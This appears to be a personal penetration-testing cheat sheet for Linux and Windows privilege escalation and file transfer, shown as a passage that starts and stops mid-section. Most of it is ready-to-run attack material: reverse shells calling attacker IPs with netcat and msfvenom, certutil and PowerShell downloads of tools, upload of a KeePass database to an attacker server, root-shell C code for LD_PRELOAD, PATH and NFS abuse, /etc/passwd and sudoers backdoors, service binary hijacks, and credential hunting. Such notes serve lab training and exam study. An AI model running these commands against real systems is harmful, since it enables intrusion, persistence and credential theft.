powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.45.210/Invoke-ConPtyShell.ps1', 'Invoke-ConPtyShell.ps1')"

certutil -urlcache -split -f http://192.168.45.188/nc64.exe C:\Users\Public\nc64.exe
```

#### Windows -> Kali

```
upload.php
<?php
$uploaddir = '/home/nabecos/Desktop/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

sudo php -S 0.0.0.0:4444
```

```
(New-Object System.Net.WebClient).UploadFile('http://192.168.45.216:8000/upload.php', 'C:\Users\jim\Documents\Database.kdbx')
```

## Identify OS

Quickly identify the type of machine (linux/windows) by pinging and noticing the TTL value. Windows ≤ **128**; Unix/Linux ≤ **64**.

## Generate Passwords
Add words to existing password:
```
crunch 9 9 -t rockyou%^ > password_james.txt
crunch 9 9 -t rockyou^% >> password_james.txt
crunch 9 9 -t ^%rockyou >> password_james.txt
crunch 9 9 -t %^rockyou >> password_james.txt
```

Passwords based on website content:
```
cewl http://10.10.110.100:65000/wordpress -w wordlist.txt
```

## Git Commands

**Enumerate Current Files for Credentials

```
grep -RniE "password|secret|token|key|api|credential" .

Select-String -Path .\* -Pattern "password|secret|token|key|api|credential" -Recurse
```

Previous Commits:

```
git log

git log -p | findstr /i "password secret token key api credential"
```

Commit differences:

```
git diff <commit_id>
git diff <old_commit> <new_commit>
```


Change to Old Commit:

```
git checkout <commit_id>
git checkout main
```

# Privilege Escalation

## Linux

### Automatic Enumeration

#### Linpeas

```
wget http://10.10.10.10/linpeas.sh;chmod 777 ./linpeas.sh./linpeas.sh -a -e -P <password>
```


#### Linux Exploit Suggester

https://github.com/The-Z-Labs/linux-exploit-suggester

#### LinEnum

https://github.com/rebootuser/LinEnum

#### Linux Smart Enumeration

https://github.com/diego-treitos/linux-smart-enumeration

### Port Forwarding

```
./socat64 -ddd TCP-LISTEN:2345,fork TCP:127.0.0.1:65432 &
```


**Mysql**

If you find that mysql is running as root and you username and password to log in to the database you can issue the following commands:

```
select sys_exec('whoami');
select sys_eval('whoami');
```

### Spray passwords we know to other users

```
su user
```

### Password Hunting

File Content:
```
grep --color=always -rnEi "passw|passwd|password|passcode|credentials|cred|key|apikey|secret|seckey|auth|authentication|authkey|token|jwt|oauth|ssh_key|private_key|pem|pfx|cert|certificate|hash|md5|sha1|sha256|sshpass" './' 2>/dev/null

grep --color=always -rnEi "clay|lisa|ftp" './' 2>/dev/null

#if binary file matches add the -a flag
#Exclusions
--exclude="*.css"
--exclude="*.js"
--exclude="*.map"


find ./ -type f -iname "*conf*"
find / -type f -iname "flag.txt"
```

Files:
```
find /home /root /etc /opt /var -type f \( -iname "*.conf" -o -iname "*.config" -o -iname "*.kdbx" -o -iname "*.json" -o -iname "*.ini" -o -iname "*.yml" -o -iname "*.yaml" -o -iname "*.xml" -o -iname "*.env" -o -iname "*.log" -o -iname "*.db" -o -iname "*.sqlite" -o -iname "*.dat" -o -iname "*.crt" -o -iname "*.pem" -o -iname "*.key" -o -iname "*.cert" -o -iname "*.pfx" -o -iname "*.ppk" -o -iname "*.cnf" -o -iname "*.htpasswd" \) -o \( -iname "*password*" -o -iname "*passwd*" -o -iname "*cred*" -o -iname "*secret*" -o -iname "*apikey*" -o -iname "*auth*" -o -iname "*token*" -o -iname "*jwt*" -o -iname "*oauth*" -o -iname "*ssh_key*" -o -iname "*private_key*" -o -iname "*cert*" -o -iname "*hash*" -o -iname "*md5*" -o -iname "*sha1*" -o -iname "*sha256*" -o -iname "*sshpass*" \) 2>/dev/null
```

### Cross-Compile
```
i686-w64-mingw32-gcc 40564.c -o pwn.exe -lws2_32

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

### Kernel Exploits

- Search Linux Kernel Version Online

### Files

- Web Directory - Passwords on configuration files
- Write capability on Application web root to get reverse shell as www-data
- Local Databases
- Can read .ssh from my user? Other users? Root?

```
cat .bashrc
cat .bash_history
history
```

### Environmental Variables

- Search for passwords `env`

### Sudo

```
sudo -l
```

1. GTFOBins

2. LD_PRELOAD

On some systems, you may see the LD_PRELOAD environment option.

LD_PRELOAD is a function that allows any program to use shared libraries. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
4. The C code will simply spawn a root shell and can be written as follows;

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Then:
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

3. LD_LIBRARY_PATH
Check shared libraries of a program:

```
ldd <program>
ldd /usr/sbin/apache2
```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using code that spawns a shell.

```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Compile it and run the exploit:

```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
```


3. Unknown Binary
	- Check Online for Exploits
	- Check online for RCE
	- Check Help command or man to see if you can run code
	- `strings binary` and `strings -e binary`
	- `strace binary`
	- Run the Binary to see if it takes arguments for BOF (GDB installed on machine?)

#### Version/CVEs

- Search sudo version online

**CVE-2019-14287**

Requirements:

- Sudo <1.8.28
- (ALL, !root) /bin/bash or other commands

[https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

Sudo doesn't check for the existence of the specified user id and executes the binary with arbitrary user id with the sudo priv -u#-1 returns as 0 which is root's id.

Check for the user sudo permissions.

```
sudo -l
```

User hacker may run the following commands on kali: (ALL, !root) /bin/bash

```
sudo -u#-1 <command>
sudo -u#-1 /bin/bash
```

 **CVE-2019-28634**

[https://github.com/saleemrashid/sudo-cve-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634)

Requirements:

In Sudo before 1.8.26, if pwfeedback is enabled in /etc/sudoers, users can trigger a stack-based buffer overflow in the privileged sudo process. (pwfeedback is a default setting in Linux Mint and elementary OS; however, it is NOT the default for upstream and many other packages, and would exist only if enabled by an administrator.) The attacker needs to deliver a long string to the stdin of getln() in tgetpass.c.

- Sudo < 1.8.26
- pwfeedback enabled

`./exploit`

### Groups

#### Sudo/Admin
Method 1
```
sudo su
```

Method 2
If you find that the binary **pkexec is a SUID binary** and you belong to **sudo** or **admin**, you could probably execute binaries as sudo using `pkexec`.

```bash
pkexec "/bin/sh"
```

If you get error go to hacktricks they have the solution.

#### Wheel
**Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:

```
%wheel	ALL=(ALL:ALL) ALL
```

This means that **any user that belongs to the group wheel can execute anything as sudo**.

If this is the case, to **become root you can just execute**:

```
sudo su
```

#### Shadow

```
cat /etc/shadow
```

#### Staff

On Hacktricks

#### Video

Check Hacktricks

#### Root

**Check which files root members can modify**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

#### Docker

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```

#### ADM

Usually **members** of the group **`adm`** have permissions to **read log** files located inside _/var/log/_.

```
grep "CRON" /var/log/syslog

# CD to var log and search for usernames that we know exist on the machine
cd /var/log
grep --color=always -rnEi "robert|root|mark|cassie" './' 2>/dev/null
```

#### LXD/LXC

Check Online

#### Disk

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
cd /root
ls
cat /etc/shadow
cat /root/.ssh/id_rsa
```

Copy Files:

```bash
debugfs -w /dev/sda1
dump /tmp/asd1.txt /tmp/asd2.txt
```

#### Auth
Inside OpenBSD the **auth** group usually can write in the folders _**/etc/skey**_ and _**/var/db/yubikey**_ if they are used.  
These permissions may be abused with the following exploit to **escalate privileges** to root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

### SUID/SGID

```
find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
find / -perm -g=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null -exec ls -la {} \;
```

1. GTFOBins
2. Unknown Binary
	- Check Online for Exploits
	- Check online for RCE
	- Check Help command or man to see if you can run code
	- `strings binary`
	- `strace binary`
	- Run the Binary to see if it takes arguments for BOF (GDB installed on machine?)

#### Shared Object Injection

```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```
See where the missing file should be placed and create a path to that compiled file.

```
mkdir /home/user/.config
gcc -shared -fPIC -o <output.so file with the name of the shared library which was missing> <name of the .c file to compile>
```

The code should be something like this (-p preserves permissions)

```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```

Finally, run the binary and get root.

#### PATH Hijack

Run strings on the file to look for strings of printable characters:

```
strings <binary>
```

Extract: `service apache2 start` This means the service is being called from using the PATH variable.

```
nano service.c

int main() {
	setuid(0);
	system("/bin/bash -p");
}

gcc -o <output binary name> <code to be compiled location>
PATH=.:$PATH
or
PATH=<path to binary folder>:$PATH
/usr/local/bin/suid-env

```

This means we can compile code into a custom executable and place it in a writable location. Then we can add it to the PATH variable and run the original binary.

#### Bash < 4.2-048
In **Bash versions <4.2-048** it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

The /usr/sbin/service function is defined, with the command /bin/bash -p being executed within it. The /usr/sbin/service function is then exported, making it available for use in other scripts.

```
strings /usr/local/bin/suid-env2

/bin/bash --version

function <binary path as file name> { /bin/bash -p; }
function /usr/sbin/service { /bin/bash -p; }
export -f <file>
export -f /usr/sbin/service

/usr/local/bin/suid-env2
```

#### Bash < 4.4

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

```

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```

#### Symlinks Nginx Exploit (CVE-2016-1247)

**Nginx Exploit (CVE-2016-1247)**

Use linux exploit suggester or:

```
dpkg -l
dpkg -l | grep nginx

```

Notice that the installed nginx version is below 1.6.2-5+deb8u3.

**Requirements:**

- You need to be www-data
- Have write access to /var/log/nginx
- SUID bit set in nginx

**Attack:**

As the /var/log/nginx directory is owned by www-data, it is possible for local attackers who have gained access to the system through a vulnerability in a web application running on Nginx (or the server itself) to replace the log files with a symlink to an arbitrary file.

Upon nginx startup/restart the logs would be written to the file pointed to by the symlink.

This allows attackers to escalate privileges to root.

```
./nginxed-root.sh /var/log/nginx/error.log
```

Wait for the service to restart (everyday at 6:25) and you should get root.

### Capabilities

We can use the getcap tool to list enabled capabilities.

```
getcap -r / 2>/dev/null
```

When run as an unprivileged user, getcap -r / will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.

Check GTFOBins.

Examples:
```
/usr/bin/python2.6 = cap_setuid+ep
/home/user/openssl =ep

view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' 

vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' 

python -c 'import os; os.setuid(0); os.system("/bin/sh")' 

tar -cvf shadow.tar /etc/shadow;tar -xvf shadow.tar;cat etc/shadow
```

### Read Write Files

**Write /etc/passwd**

```
openssl passwd w00t
echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

**Read /etc/shadow**

```
cat /etc/shadow
unshadow <copy-passwd> <copy-shadow> > unshadowed.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

hashcat -m 1800 unshadowed.txt rockyou.txt
```

**Write /etc/shadow**

```
mkpasswd -m sha-512 newpasswordhere
```

Substitute root password

**Write /etc/sudoers**

```
echo '<user> ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
sudo -l
sudo su
```

### Services

```
watch -n 1 "ps -aux | grep pass"
```

### Cron Jobs

Always check $PATH Variable in the Cron Job! Check if you have write privileges on a folder.

```
cat /etc/crontab
crontab -l
sudo crontab -l
grep "CRON" /var/log/syslog
```

Check other files! /etc/cron.d etc...

1. You can try to edit the file
2. If the full path of the file is not being used you can try to create another one earlier in $PATH where you have write privileges

Additionally:
```
watch -n 1 "ps -aux"
watch -n 1 "ps -aux | grep pass"
```

#### Systemctl
```
systemctl list-timers

systemctl status <service>
```

#### PSPY

```
chmod +x pspy64
./pspy64
```

### SSH

**Find Private Keys**

```
ls -la /home /root /root/.ssh /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2> /dev/null; find / -name id_dsa 2> /dev/null; find / -name authorized_keys 2> /dev/null; cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsa
```

**Readable Private Keys**

```
chmod 600 file
ssh -i file user_name@X.X.X.X
```

**Writeable SSH Keys**

The easiest way to exploit this is to generate a new SSH key pair, add the public key to the file and login in using the private key:

```
ssh-keygen
```

Copy public key file to target:

```

cat ~/.ssh/id_rsa.pub | ssh user_name@X.X.X.X "cat >> /home/user_name/.ssh/authorized_keys"
```

### Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```
mount -l
cat /etc/fstab
```

### NFS

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

**Step 1**

Enumerate mountable share from our attacker machine.

```
showmount -e <ip>
```

**Step 2**

Mount one of the "no_root_squash" shares from our attacking machine

```
mkdir <local tmp folder>
mount -o rw <ip>:/<path to mountable share> <created local tmp folder>
```

**Step 3**

As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.

```
int main()
{
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}
```

```
gcc nfs.c -o nfs -w
chmod +s nfs
ls -l nfs
```

**Step 4**

Change to the victim prompt and launch the script.

```
./nfs

```

**Technique 1**

Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

```
cat /etc/exports
```

**Note that the /tmp share has root squashing disabled.**

Kali box: Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):

```
sudo su
mkdir /tmp/nfs
mount -o rw,vers=3 <IP>:/tmp /tmp/nfs

```

Generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):

```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

```

Still using Kali's root user, make the file executable and set the SUID permission:

```
chmod +xs /tmp/nfs/shell.elf
```

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

`/tmp/shell.elf`

## Windows

### Execute Commands as Another User (Password Required)
Invoke-RunasCs.ps1
```
certutil -split -urlcache -f http://192.168.45.197/Invoke-RunasCs.ps1
Import-Module .\Invoke-RunasCs.ps1
Invoke-RunasCs svc_mssql trustno1 "C:\xampp\htdocs\uploads\shell64.exe"
Invoke-RunasCs domain\user password "C:\Users\Public\nc64.exe 192.168.45.166 443 -e powershell" --force-profile --logon-type 2

runas /env /profile /user:DVR4\Administrator "C:\temp\nc.exe -e cmd.exe 192.168.118.14 443"
runas /user:oscp\bernie cmd.exe
# With RDP we can run as administrator (cmd) and type cleartext creds of other admin user
```

### Port Forward
```
netstat -ano
```

```
./chisel server --port 8080 --reverse
.\chiselx64.exe client 10.10.16.6:8080 R:3333:127.0.0.1:4444

plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
```

### Kernel Exploits
https://github.com/SecWiki/windows-kernel-exploits

```
systeminfo
python2 windows-exploit-suggester.py --update 
python2.7 windows-exploit-suggester.py --database <file> --systeminfo <systeminfo.txt>
```

**Metasploit Module**

`run post/multi/recon/local_exploit_suggester`

**Python to Binary**

If we have an exploit written in python but we don't have python installed on the victim-machine we can always transform it into a binary with pyinstaller. Good trick to know.

### Automated Tools

#### PowerUp

```
 certutil.exe -urlcache -split -f http://192.168.10.10/PowerUp.ps1
 powersehll -ep bypass
 Invoke-AllChecks
```

#### Winpeas.exe (all including plaintext passwd)

```
certutil.exe -urlcache -split -f http://192.168.10.10:8080/winPEASx64.exe
.\winPEASx64.exe
```

Colors: 
```
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

#### PrivescCheck

```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
```

#### PowerView
https://www.scribd.com/document/371576849/Power-View
```
powershell -ep bypass
. .\PowerView.ps1
```
https://gist.github.com/macostag/44591910288d9cc8a1ed6ea35ac4f30f

### Privileges

```
whoami /all
```

If nothing is working use SweetPotato and Netcat:
https://github.com/CCob/SweetPotato

```
.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"
```

### Password Hunting
Potential Interesting files
```
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.kdbx,*.log -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Search for passwords in files:
```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "pass" *.*

```

Find common files:
```
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini

Get-ChildItem -Path C:\xampp -Include .txt,.ini -File -Recurse -ErrorAction SilentlyContinue
type C:\xampp\passwords.txt
type C:\xampp\mysql\bin\my.ini
```

Registry passwords:

```
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

```
./lazagne.exe all
```

### Services

Check if Service is 32 or 64 bit:

```
Add-Type -MemberDefinition @'
[DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool IsWow64Process(
    [In] System.IntPtr hProcess,
    [Out, MarshalAs(UnmanagedType.Bool)] out bool wow64Process);
'@ -Name NativeMethods -Namespace Kernel32

Get-Process "FJTWSVIC" | Foreach {
    $is32Bit=[int]0 
    if ([Kernel32.NativeMethods]::IsWow64Process($_.Handle, [ref]$is32Bit)) { 
        "$($_.Name) $($_.Id) is $(if ($is32Bit) {'32-bit'} else {'64-bit'})" 
    } 
    else {"IsWow64Process call failed"}

```

#### Service Enumeration

PowerUp:
```
Test-ServiceDaclPermission          -   tests one or more passed services or service names against a given permission set

Get-UnquotedService                 -   returns services with unquoted paths that also have a space in the name

Get-ModifiableServiceFile           -   returns services where the current user can write to the service binary path or its config

Get-ModifiableService               -   returns services the current user can modify

Get-ServiceDetail                   -   returns detailed information about a specified service

Set-ServiceBinaryPath               -   sets the binary path for a service to a specified value

Invoke-ServiceAbuse                 -   modifies a vulnerable service to create a local admin or execute a custom command

Write-ServiceBinary                 -   writes out a patched C# service binary that adds a local admin or executes a custom command

Install-ServiceBinary               -   replaces a service binary with one that adds a local admin or executes a custom command

Restore-ServiceBinary               -   restores a replaced service binary with the original executable
```

Manual:

**Running Services**

```bash
#List all non standard services
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" 

#Running and non-standard
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running' -and $_.PathName -notmatch 'C:\\Windows'}

#Running/Not Running and non-standard
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.PathName -notmatch 'C:\\Windows'}

#Running/Not Running and non-standard
Get-Service | Select-Object Name,Status,@{Name="PathName";Expression={(Get-WmiObject -Class Win32_Service -Filter "Name='$($_.Name)'").PathName}} | Where-Object {$_.PathName -notmatch 'C:\\Windows'} | fl *

#Running and non-standard
Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object Name,Status,@{Name="PathName";Expression={(Get-WmiObject -Class Win32_Service -Filter "Name='$($_.Name)'").PathName}} | Where-Object {$_.PathName -notmatch 'C:\\Windows'} | fl *

#As LocalSystem and non standard
(gci HKLM:\\SYSTEM\\CurrentControlSet\\Services | Get-ItemProperty | where {$_.ObjectName -match 'LocalSystem'} | Where-Object {$_.ImagePath -notmatch 'C:\\Windows'}).PSChildName
(gci HKLM:\\SYSTEM\\ControlSet001\\Services | Get-ItemProperty | where {$_.ObjectName -match 'LocalSystem'} | Where-Object {$_.ImagePath -notmatch 'C:\\Windows'}).PSChildName
```

**Service Info (SC Commands)**

```bash
sc.exe
sc query
sc query state= all
sc qc <service>
```

**Check Service Permissions (DACL)**
    1. **AccessChk (Sysinternals)**

```bash
accesschk64.exe -wuvc Everyone *
accesschk64.exe -wuvc <service>
accesschk64.exe -qlc <service>
accesschk64.exe /accepteula -c Scheduler
accesschk64.exe /accepteula -qlc Scheduler
accesschk64.exe /accepteula -vu michelle -c Scheduler
accesschk64.exe /accepteula -ucqv IObitUnSvr
```

1. **SC with SDDL Output**

```bash
sc sdshow <service>
sc.exe sdshow Scheduler
```

1. **Get-ACL & Get-Service**

```bash
Get-Service -Name <service> | ForEach-Object { Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\$($_.Name)" }

powershell -ep bypass '. .\Get-ServiceAcl.ps1; Get-ServiceAcl "IObitUnSvr" | select -ExpandProperty Access'
```

1. **GUI Method**
    1. Run `services.msc`
    2. Right-click the service → **Properties** → **Security tab** (if available)

**Check Service Executable Permissions**

```bash
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

| Mask | Permissions       |
| ---- | ----------------- |
| F    | Full access       |
| M    | Modify access     |
| RX   | Read and execute  |
| R    | Read-only access  |
| W    | Write-only access |


#### Insecure Service Permissions

If the **service DACL** (not the binary) allows **SERVICE_CHANGE_CONFIG**,

you can reconfigure it to run any executable as **LocalSystem**.

**Step 1: Verify Permissions**

Confirm that the current user can modify the service via **AccessChk**, **SC**, or **Get-ServiceAcl**.

**Step 2: Build Payload and Start Listener**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o NAME.exe

nc -lnvp PORT
```

Grant full access to the payload:

```bash
icacls C:\\Users\\<user>\\payload.exe /grant Everyone:F
```

**Step 3: Reconfigure Service to Execute Payload**

```bash
sc.exe config IObitUnSvr binPath= "C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe" obj= LocalSystem

sc.exe config IObitUnSvr binPath= "cmd.exe /c C:\\Users\\dharding\\Documents\\nc.exe -e cmd.exe 10.10.16.2 80" obj= LocalSystem
```

**Step 4: Restart Service to Trigger Payload**

```bash
sc stop <service>
sc start <service>

# or
sc.exe stop <service>
sc.exe start <service>

#or 

Stop-Service <service>
Start-Service <service>
Restart-Service <service>
```

#### Service Binary Replace

**Step 1: Create Malicious Executable**

```powershell
icacls "C:\\xampp\\mysql\\bin\\mysqld.exe"
```

|Mask|Permissions|
|---|---|
|F|Full access|
|M|Modify access|
|RX|Read and execute access|
|R|Read-only access|
|W|Write-only access|

**Step 2: Create Malicious Executable**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=80 -f exe -o IUService.exe
```

We can then create a reverse shell payload with msfvenom or alternatively create an executable that creates a new local administrator:

```powershell
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

Compile and upload:

```powershell
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
iwr -uri <http://192.168.48.3/adduser.exe> -Outfile adduser.exe
```

Restart service:

```powershell
net stop mysql
net start mysql
Stop-Process mysql
Start-Process mysql
```

If service is “auto”/2 and you can restart server (SeShutdownPrivilege→Disabled) do it:

```
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'mysql'}

whoami /priv

shutdown /r /t 0
```
#### Unquoted Service Path

```
Get-UnquotedService
```

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName,StartMode | Select-String "C:\\\\Windows" -NotMatch | Select-String '"' -NotMatch

# Excludes Windows Services and ones enclosed in quotes
wmic service get name,pathname,startname |  findstr /i /v "C:\\Windows\\\\" | findstr /i /v """
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

Stop-Service GammaService
Start-Service GammaService

icacls "C:\\"
icacls "C:\\Program Files\\"
icacls "C:\\Program Files\\Enterprise Apps"
```

### PowerShell history
```
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```


### Scheduled Tasks

```
Get-ScheduledTask | select taskname,state,author,taskpath,uri,@{ n = 'UserId'; e = { $_.principal.userid}} 

schtasks /query /fo list /v 
schtasks /query /tn <task> /fo list /v 
schtasks /query /tn <task> /XML

icacls c:\tasks\schtask.bat

echo c:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> <PORT> > C:\tasks\schtask.bat 
schtasks /run /tn vulntask 
Start-ScheduledTask -TaskName "vulntask"
```

### DLL Hijacking

```
Find-ProcessDLLHijack               -   finds potential DLL hijacking opportunities for currently running processes

Find-PathDLLHijack                  -   finds service %PATH% DLL hijacking opportunities

Write-HijackDll                     -   writes out a hijackable DLL
```

Safe Mode Check:

```
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode
```
**Standard Search Order** (Safe DLL Search Mode enabled):
    1. Directory of the application.
    2. System directory. (C:\Windows\System32)
    3. 16-bit system directory. (C:\Windows\System)
    4. Windows directory. (C:\Windows)
    5. Current directory.
    6. Directories in the PATH environment variable.
    
    ($env:Path -split ';'|sort -u|%{ $_.Trim('"') })|%{icacls $_}
    
    
- When Safe DLL Search Mode is disabled, the current directory moves up to the second position, making it easier to exploit.

Check all running processes DLLs loaded:
```
Get-Process | Select-Object Name,Id,Path,Modules (Get-Process -Name notepad).Modules | Select-Object Name,FileName

Get-CimInstance -ClassName Win32_Process | Select-Object Name,ProcessId,ExecutablePath
```

If there is an Executable that seems phishy you should grab it and run it locally to check which DLLs are loaded: (Process Monitor)


### Registry Keys

Check registry keys we can modify (Services are interesting since they are ran as SYSTEM Accounts: HKLM\System\CurrentControlSet\Services):

```powershell
accesschk64.exe -w -v "HKLM\\System\\CurrentControlSet\\Services"

Get-ChildItem -Path HKLM:\\Software\\ -Recurse -ErrorAction SilentlyContinue
Get-Acl -Path hklm:\\System\\CurrentControlSet\\services\\regsvc | fl
```

After verifying we have access to modify this registry key, modify it and start it with a malicious payload (get reverse shell or create user and add to admin group):

```powershell
reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\\temp\\x.exe /f

sc start regsvc
```

### AlwaysInstallElevated

```
Get-RegistryAlwaysInstallElevated   -   PowerUp checks if the AlwaysInstallElevated registry key is set

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If these are set, you can generate a malicious .msi file using msfvenom, as seen below:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.53.201 LPORT=LOCAL_PORT -f msi -o malicious.msi
```

Start multi/handler and run the installer with the command below and receive the reverse shell:

```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

### Auto-Run

```
Get-ModifiableRegistryAutoRun       -   checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns
```

Query this registry key or others ([https://hacktricks.boitatech.com.br/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries](https://hacktricks.boitatech.com.br/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries)):

```powershell
